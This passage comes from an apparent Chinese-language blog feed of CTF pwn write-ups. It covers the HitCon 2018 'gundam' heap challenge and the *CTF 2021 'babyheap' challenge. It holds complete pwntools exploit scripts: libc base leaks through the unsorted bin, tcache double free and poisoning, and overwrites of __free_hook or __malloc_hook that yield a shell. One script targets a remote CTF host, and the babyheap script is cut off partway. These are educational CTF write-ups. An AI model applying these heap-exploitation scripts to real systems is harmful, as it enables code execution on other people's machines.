class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(base+<span class="number">0x41780</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="减少gdb调试依赖"><a href="#减少gdb调试依赖" class="headerlink" title="减少gdb调试依赖"></a>减少gdb调试依赖</h2><p>但我们这样做有缺陷，我们所有的地址都是通过本地gdb一个一个gdb出来。所有偏移的计算过程，都有本地gdb参与。然不同的libc下，各symbols的偏移是不同。而远程下我们是不能进行gdb调的。但我们发现，libc与<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址的偏移差距不仅固定，而且就是symbols在so文件中地址的差异。</p><p><img src="image-20210504002319132.png" alt="image-20210504002319132"></p><p>这样利用pwntool 中的<code>symbols</code>来获得偏移，从而减少了对gdb调试的依赖。同时，又通过附件中的libc得到了远程环境的相同的偏移。</p><p>这样写法的完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line">l=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">main_arena=u64(addr)<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arene:'</span>+hex(main_arena))</span><br><span class="line">base=main_arena<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'libc_base:'</span>+hex(base))</span><br><span class="line">free_hook=base+l.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">log.info(<span class="string">'free_hook:'</span>+hex(free_hook))</span><br><span class="line">system_addr=base+l.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="远程libc基地址泄露"><a href="#远程libc基地址泄露" class="headerlink" title="远程libc基地址泄露"></a>远程libc基地址泄露</h2><p>前面，我们虽然利用题目的附件里的libc来解决<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址的在远程环境和本地环境下偏移的差距但是libc基地址的问题依然没有解决。我们观测远程libc基地址仅仅看<code>main_arena</code>-gdb出偏移得到的地址后三位是否为0，但地址后三位是为0的地址不一定是libc基址。</p><p><img src="image-20210504003927457.png" alt="image-20210504003927457"></p><p>因为在一些附件so文件中，<code>main_arena</code>是没有的,但是有<code>__malloc_hook</code>和<code>__realloc_hook</code>。</p><p><img src="image-20210504100155315.png" alt="image-20210504100155315"></p><p>我们不可能通过<code>real_base_libc=main_arena_add-l.symbols[&#39;main_arena&#39;]</code>来获得基地址。但如果我们gdb过<code>main_arena</code>的地址和看过libc结构就可以发现<code>__malloc_hook</code>和<code>__realloc_hook</code>这两个symbols其实”挨得近”且这距离不受libc版本影响。</p><p><img src="image-20210504094456672.png" alt="image-20210504094456672"></p><p>因此我们可以通过,<code>mian_arena-0x10</code>得到<code>__malloc_hook</code>的真实地址<code>__malloc_hook_addr</code>，<code>mian_arena-0x18</code>得到<code>__realloc_hook</code>的真实地址<code>__realloc_hook_addr</code>。<code>__malloc_hook_addr-l.symbols[&quot;__malloc_hook&quot;]</code>或<code>__realloc_hook_addr-l.symbols[&quot;__realloc_hook&quot;]</code>都可以得到libc的基地址。</p><p><img src="image-20210504101842757.png" alt="image-20210504101842757"></p><p>这样我们就可以不通gdb出libc偏移，就可以得到远程libc的准确基址。</p><h2 id="无so文件推算远程地址"><a href="#无so文件推算远程地址" class="headerlink" title="无so文件推算远程地址"></a>无so文件推算远程地址</h2><p>经过上面步骤改进，我们已经能做到准确得到远程环境地址中任意敏感symbols的地址。但是，我们这过程太依赖题目附近中的so文件。so文件的准确有效性，直接影响到我推算远程地址。那么若题目给了错误的libc或题目只给了libc大版本号没有给出so文件，那还能做题吗?</p><p>回顾整个过程，在整个过程中我们最值得信任的地址就是通过<code>unsorted bin</code>得到<code>main_arena</code>的地址以及通过<code>main_arena</code>所得到的<code>__malloc_hook</code>或<code>__realloc_hook</code>的地址。这是由于这些地址是从单纯利用glibc chunk管理机制中所得到的。</p><p>再回想到，栈溢出时我们获得libc基址时我们只泄露一个函数的最低的 12 位就可以找到相应libc版本。其应用的原理是：</p><blockquote><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。<br>        即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p></blockquote><p>既然函数是libc symbols中的一种，那么<code>__malloc_hook</code>或<code>__realloc_hook</code>这些 libc中的变量能一样吗？</p><p>经过查询<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>和测试发现<code>__malloc_hook</code>或<code>__realloc_hook</code>这些变量symbols也和函数一样被记录下来。而且:</p><p><strong>在libc中，不仅函数所有libc symbols在 libc.so 动态链接库中,相对之间相对偏移是固定的</strong>。</p><p><strong>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，所有libc symbols最低的 12 位并不会发生改变。</strong></p><p>因此我们可以向在做栈溢出一样，用LibcSearcher来找到远程libc版本，从而推算出各个敏感symbols的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">libc = LibcSearcher(<span class="string">'__malloc_hook'</span>, malloc_hook)<span class="comment">#寻找libc版本</span></span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">'__malloc_hook'</span>)<span class="comment">#计算基地地址</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)<span class="comment">#计算system函数地址</span></span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.dump(<span class="string">'__free_hook'</span>)<span class="comment">#计算__free_hook变量地址</span></span><br><span class="line">log.info(<span class="string">'libcbase+free_hook:'</span>+hex(libcbase+libc.dump(<span class="string">'__free_hook'</span>)))</span><br></pre></td></tr></table></figure><h2 id="2018-HitCon-Pwn-gundam-远程exp"><a href="#2018-HitCon-Pwn-gundam-远程exp" class="headerlink" title="2018-HitCon-Pwn-gundam 远程exp"></a>2018-HitCon-Pwn-gundam 远程exp</h2><p>综上，我们可以利用这些tirck做出一些“阴间环境”的堆题，2018-HitCon-Pwn-gundam就是其中一道（笑）</p><p><img src="buu_gundam.png" alt="image-20210504112333320"></p><p>由于libc不准确，在buu上题目做出人很少。我们可以用我们上面用到的方法找与题目相匹配的libc。从而解决题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25457</span>)</span><br><span class="line"><span class="comment">#p=process('./gundam')</span></span><br><span class="line"><span class="comment">#l=ELF('./libc.so.6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">blow_up()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">visit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Gundam[7] :aaaaaaaa'</span>)</span><br><span class="line">addr=p.recv()[<span class="number">1</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">x=int(hex(u64(addr))+<span class="string">'40'</span>,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex(x))</span><br><span class="line"></span><br><span class="line">malloc_hook=x<span class="number">-0x10</span></span><br><span class="line">log.info(<span class="string">'malloc_hook:'</span>+hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'__malloc_hook'</span>, malloc_hook)</span><br><span class="line">libcbase = malloc_hook - libc.dump(<span class="string">'__malloc_hook'</span>)</span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+free_hook:'</span>+hex(libcbase+libc.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">blow_up()</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">build(p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>找到与远程相匹配的libc，就可以得到flag。</p><p><img src="gundam_2.png" alt="image-20210504112951072"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做pwn时,一直烦扰我的是本地打通了,远程打不通的情况。这情况在做堆题时印象最为深刻，因为在做堆题我们往往只能从附件或提示中得到题目环境的libc的大版本，导致我们在计算偏移时会与远程存在差异。因此本文从本地泄露地址讲起，如何避免偏移libc版本地址偏移差异导致功亏一篑。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2021*CTF_PWN_babyheap复现记</title>
    <link href="lexsd6.github.io/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/"/>
    <id>lexsd6.github.io/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/</id>
    <published>2021-04-28T02:24:16.572Z</published>
    <updated>2021-04-28T02:29:18.894Z</updated>
    
    <content type="html"><![CDATA[<p>最近查阅了很多关于堆的资料，也做了很多关于堆的题。慢慢开始回顾下那年没有被啃动的pwn 堆题。</p><p>babyheap是当时*CTF 2021中最简单的pwn，但是当时做堆还一窍不通，一直搞不懂堆的机制关系。如今再细细分析发现还挺有意思的。<a id="more"></a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目保护全开:</p><p>分析逆向后的代码可以看到:</p><p>add 函数限制了我们只能申请0x20~0x70大小的chunk(刚开始没有反映过来0x60&gt;0x60的结果为false),且只能申请15个.</p><p><img src="image-20210427214048652.png" alt="image-20210427214048652"></p><p>edit和delete在调有时看起来只要pools有值就可以free后依然可以调用.在delete时,在add中所创造的pools[v1]与sizes[v1]在,没有新的值覆盖下不会被清空的.这样我们可以在一个chunk free后依然可以操控.</p><p><img src="image-20210427213937736.png" alt="image-20210427213937736"></p><p><img src="image-20210427214135176.png" alt="image-20210427214135176"></p><p>在leaveYouname函数中,会创造一个大的chunk 会触发<code>_int_malloc</code>中的<code>malloc_consolidate</code>进行fast bin的合并.但该函数只能运行一次.</p><p><img src="image-20210427214211389.png" alt="image-20210427214211389"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>由于chunk free后加入bins fd指针起到重要的作用,但是edit限制了我们修改fd.</p><p>但分析过程可以得知我们可以先填满Tcache,然后创造几个fast bin,然后利用leaveYouname进行合并,从而得到一个smallbins从而泄露出libc的基地址.</p><p><img src="image-20210427222140086.png" alt="image-20210427222140086"></p><p>由于,在有tache bin 与small bins下我们申请malloc 一个chunk,程序会先对tache bin中的chunk 进行查询再从samllbins切割分配.我们可以创造几个大小合理且不在tache bin中的chunk,从而让程序分配切割smallbins。</p><p><img src="image-20210427224028856.png" alt="image-20210427224028856"></p><p>同时，我们再利用free后依然可以调用edit的特性，修改新分配再释放的chunk的fd。</p><p>这里有个特性：加入tachebins 后，tachebins 没有在它出去时，检查地址对于’chunk’的size是否还是加入时的大小和地址。导致tachbins里地址可以被窜改后，然后取出时分配到窜改后的地址的地方。（ps：tachbins 存放的是chunk 内容的地址）</p><p><img src="image-20210427224943217.png" alt="image-20210427224943217"></p><p>我们可以将<code>__malloc_hook</code>-0x10的地址从而得到<code>__malloc_hook</code>和<code>__realloc_hook</code>写的权利，修改写入one_gadget和<code>__libc_realloc</code>调节，从而得到shell。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./1pwn'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input content'</span>)</span><br><span class="line">p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaveYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x59</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x58</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">leaveYourName(<span class="string">'k'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">caddr=u64(p.recvuntil(<span class="string">'\x55'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x970</span><span class="comment"># 本来想直接给tachet结果发现搞复杂了</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">':'</span>+hex(caddr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">base=addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">'1111'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'__malloc_hook:'</span>+hex(base))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)+p64(base+e.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span 